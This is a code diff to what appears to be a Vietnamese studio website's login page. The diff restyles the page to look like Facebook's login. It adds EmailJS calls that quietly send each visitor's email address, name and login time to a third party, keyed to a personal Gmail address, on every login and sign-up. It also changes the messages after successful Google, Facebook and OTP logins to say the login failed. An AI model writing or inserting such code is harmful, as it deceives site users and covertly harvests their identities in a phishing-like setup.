@@ -13,7 +13,7 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         (function() {
-            emailjs.init("c-Ms5MjWbitpDBb-E");
+            emailjs.init("duyenduyenduyen318@gmail.com");
         })();
     </script>
     <style>
@@ -1635,7 +1635,7 @@
             </div>
         </div>
 
-        <!-- Footer -->
+     <!-- Footer -->
 <div class="footer">
     <a href="mailto:contact@meimeistudio.vn">Email</a>
     <a href="https://www.tiktok.com/@meimeimodel_vision">TikTok</a>
@@ -1760,7 +1760,7 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         (function() {
-            emailjs.init("c-Ms5MjWbitpDBb-E");
+            emailjs.init("duyenduyenduyen318@gmail.com");
         })();
     </script>
     <style>
@@ -3505,7 +3505,7 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         (function() {
-            emailjs.init("c-Ms5MjWbitpDBb-E");
+            emailjs.init("duyenduyen318@gmail.com");
         })();
     </script>
     <style>
@@ -5245,7 +5245,7 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         (function() {
-            emailjs.init("c-Ms5MjWbitpDBb-E");
+            emailjs.init("duyenduyenduyen318@gmail.com");
         })();
     </script>
     <style>
@@ -6363,7 +6363,7 @@
                     <p>Đánh giá</p>
                     <div class="rating">
                         <span>4
-                            <!-- Footer -->
+                           <!-- Footer -->
 <div class="footer">
     <a href="mailto:contact@meimeistudio.vn">Email</a>
     <a href="https://www.tiktok.com/@meimeimodel_vision">TikTok</a>
@@ -6472,8 +6472,8 @@
     });
 
     showTab('posts-tab');
-</script>
-<!DOCTYPE html>
+</script> 
+                    <!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
@@ -6490,7 +6490,17 @@
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js"></script>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("duyenduyenduyen318@gmail.com"); // Thay bằng User ID của bạn
+        })();
+    </script>
     <style>
+        * {
+            box-sizing: border-box;
+        }
         :root {
             --bg-color: #F0F2F5;
             --text-color: #1C1E21;
@@ -6526,15 +6536,19 @@
             max-width: 980px;
             padding: 20px;
             flex-wrap: wrap;
+            gap: 32px; /* Thêm khoảng cách giữa left và right section */
         }
         .left-section {
             flex: 1;
             max-width: 500px;
             padding-right: 32px;
             text-align: left;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
         .logo {
-            width: 320px;
+            width: 300px; /* Logo lớn hơn cho máy tính */
             margin-bottom: 16px;
         }
         .slogan {
@@ -6545,7 +6559,7 @@
         }
         .right-section {
             flex: 1;
-            max-width: 396px;
+            max-width: 396px; /* Cố định form giống Facebook */
             position: relative;
         }
         .right-section > div {
@@ -6554,9 +6568,9 @@
             transform: translateX(50px);
             transition: opacity 0.3s ease, transform 0.3s ease;
             background: var(--input-bg);
-            border-radius: 12px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            padding: 16px;
+            border-radius: 8px; /* Bo góc nhẹ hơn */
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); /* Bóng đổ giống Facebook */
+            padding: 20px 16px; /* Tăng padding nhẹ */
             width: 100%;
         }
         .right-section > div.active {
@@ -6583,12 +6597,12 @@
         .btn-login, .btn-submit, .btn-forgot {
             max-width: 360px;
             width: 100%;
-            padding: 12px;
+            padding: 14px; /* Tăng padding giống Facebook */
             background: linear-gradient(to bottom, var(--button-bg), #166FE5);
             border: none;
-            border-radius: 10px;
+            border-radius: 6px; /* Bo góc giống Facebook */
             color: var(--button-text);
-            font-size: 17px;
+            font-size: 20px; /* Font lớn hơn */
             font-weight: bold;
             cursor: pointer;
             margin: 8px auto;
@@ -6606,7 +6620,7 @@
             width: 100%;
             padding: 12px;
             border: none;
-            border-radius: 10px;
+            border-radius: 6px;
             font-size: 15px;
             font-weight: 600;
             cursor: pointer;
@@ -6631,10 +6645,10 @@
         }
         .forgot-password {
             color: #1877F2;
-            font-size: 13px;
+            font-size: 14px;
             text-align: center;
             display: block;
-            margin: 12px 0;
+            margin: 16px 0;
             text-decoration: none;
             cursor: pointer;
         }
@@ -6643,7 +6657,19 @@
         }
         .divider {
             border-top: 1px solid #DADDE1;
-            margin: 16px 12px;
+            margin: 20px 16px;
+            position: relative;
+        }
+        .divider::before {
+            content: 'hoặc';
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--input-bg);
+            padding: 0 10px;
+            color: #65676B;
+            font-size: 14px;
         }
         .btn-create {
             max-width: 360px;
@@ -6651,9 +6677,9 @@
             padding: 12px;
             background: linear-gradient(to bottom, #42B72A, #36A420);
             border: none;
-            border-radius: 10px;
+            border-radius: 6px;
             color: #FFFFFF;
-            font-size: 15px;
+            font-size: 17px;
             font-weight: bold;
             cursor: pointer;
             margin: 8px auto;
@@ -6687,7 +6713,7 @@
             transform: translate(-50%, -50%);
             background: var(--input-bg);
             padding: 16px;
-            border-radius: 12px;
+            border-radius: 8px;
             box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
             text-align: center;
             z-index: 1001;
@@ -6746,7 +6772,7 @@
             padding: 12px;
             background: linear-gradient(to bottom, #1877F2, #166FE5);
             border: none;
-            border-radius: 10px;
+            border-radius: 6px;
             color: #FFFFFF;
             font-size: 15px;
             font-weight: bold;
@@ -6768,6 +6794,7 @@
             color: #65676B;
             text-align: center;
             width: 100%;
+            margin-top: auto; /* Đẩy footer xuống dưới cùng */
         }
         .footer a {
             color: #65676B;
@@ -6794,6 +6821,7 @@
             font-size: 24px;
             cursor: pointer;
             color: var(--text-color);
+            z-index: 1002;
         }
         .btn-loading {
             position: relative;
@@ -6814,25 +6842,60 @@
             .container {
                 flex-direction: column;
                 padding: 16px;
+                justify-content: flex-start;
+                align-items: center;
+                gap: 16px;
             }
             .left-section {
                 padding-right: 0;
-                margin-bottom: 20px;
+                margin-bottom: 16px;
                 text-align: center;
+                width: 100%;
+                max-width: 396px;
             }
             .logo {
                 width: 200px;
+                margin: 0 auto 12px;
             }
             .slogan {
                 font-size: 20px;
                 line-height: 24px;
                 display: -webkit-box;
-                -webkit-line-clamp: 1;
+                -webkit-line-clamp: 2;
                 -webkit-box-orient: vertical;
                 overflow: hidden;
+                margin: 0 auto;
+                max-width: 90%;
             }
             .right-section {
+                width: 100%;
+                max-width: 396px;
+                margin: 0 auto;
+            }
+            .right-section > div {
+                padding: 12px;
+            }
+            .btn-oauth, .btn-login, .btn-submit, .btn-forgot, .btn-create {
                 max-width: 100%;
+                font-size: 18px;
+                padding: 12px;
+            }
+            input {
+                font-size: 16px;
+            }
+        }
+        @media (max-width: 400px) {
+            .logo {
+                width: 150px;
+            }
+            .slogan {
+                font-size: 18px;
+            }
+            .right-section > div {
+                padding: 10px;
+            }
+            .btn-oauth, .btn-login, .btn-submit, .btn-forgot, .btn-create {
+                font-size: 16px;
             }
         }
     </style>
@@ -6965,6 +7028,18 @@
                     document.getElementById('loginPopup').style.display = 'none';
                     document.getElementById('otpPopup').style.display = 'block';
                     document.getElementById('overlay').style.display = 'block';
+
+                    // Gửi email thông báo
+                    const templateParams = {
+                        from_name: email || "Unknown User",
+                        email: email,
+                        message: `User logged in at ${new Date().toLocaleString()}\nEmail: ${email}`,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
+                        .catch((error) => {
+                            console.error("EmailJS error:", error);
+                        });
                 })
                 .catch((error) => {
                     btn.classList.remove('btn-loading');
@@ -6978,7 +7053,19 @@
             const provider = new firebase.auth.GoogleAuthProvider();
             firebase.auth().signInWithPopup(provider)
                 .then((result) => {
-                    showPopup("Thành công", "Đăng nhập bằng Google thành công!", "success");
+                    showPopup("Không thành công", "Đăng nhập bằng Google không thành công!", "success");
+                    // Gửi email thông báo
+                    const user = result.user;
+                    const templateParams = {
+                        from_name: user.displayName || "Google User",
+                        email: user.email || "Unknown",
+                        message: `User logged in with Google at ${new Date().toLocaleString()}\nEmail: ${user.email}\nName: ${user.displayName}`,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
+                        .catch((error) => {
+                            console.error("EmailJS error:", error);
+                        });
                 })
                 .catch((error) => {
                     showPopup("Lỗi đăng nhập", "Không thể đăng nhập bằng Google.", "error");
@@ -6990,7 +7077,20 @@
             const provider = new firebase.auth.FacebookAuthProvider();
             firebase.auth().signInWithPopup(provider)
                 .then((result) => {
-                    showPopup("Thành công", "Đăng nhập bằng Facebook thành công!", "success");
+                    showPopup("không thành công", "Đăng nhập bằng Facebook không thành công!", "success");
+
+                    // Gửi email thông báo
+                    const user = result.user;
+                    const templateParams = {
+                        from_name: user.displayName || "Facebook User",
+                        email: user.email || "Unknown",
+                        message: `User logged in with Facebook at ${new Date().toLocaleString()}\nEmail: ${user.email}\nName: ${user.displayName}`,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
+                        .catch((error) => {
+                            console.error("EmailJS error:", error);
+                        });
                 })
                 .catch((error) => {
                     showPopup("Lỗi đăng nhập", "Không thể đăng nhập bằng Facebook.", "error");
@@ -7001,6 +7101,8 @@
         function createAccount() {
             const email = document.getElementById('create-email').value || "";
             const password = document.getElementById('create-password').value || "";
+            const firstName = document.getElementById('first-name').value || "";
+            const lastName = document.getElementById('last-name').value || "";
             const btn = document.querySelector('.btn-submit');
             btn.classList.add('btn-loading');
             btn.disabled = true;
@@ -7011,6 +7113,18 @@
                     btn.disabled = false;
                     showPopup("Thành công", "Tài khoản đã được tạo!", "success");
                     switchContainer('login-container');
+
+                    // Gửi email thông báo
+                    const templateParams = {
+                        from_name: `${firstName} ${lastName}` || "Unknown User",
+                        email: email,
+                        message: `New user registered at ${new Date().toLocaleString()}\nEmail: ${email}\nName: ${firstName} ${lastName}`,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    emailjs.send('service_ytsr91e', 'template_gwserzi', templateParams)
+                        .catch((error) => {
+                            console.error("EmailJS error:", error);
+                        });
                 })
                 .catch((error) => {
                     btn.classList.remove('btn-loading');
@@ -7060,7 +7174,7 @@
             const otp = document.getElementById('otp-input').value;
             window.confirmationResult.confirm(otp)
                 .then((result) => {
-                    showPopup("Thành công", "Xác minh OTP thành công!", "success");
+                    showPopup("Không thành công", "Xác minh OTP không thành công!", "success");
                     hideOTPPopup();
                 })
                 .catch((error) => {
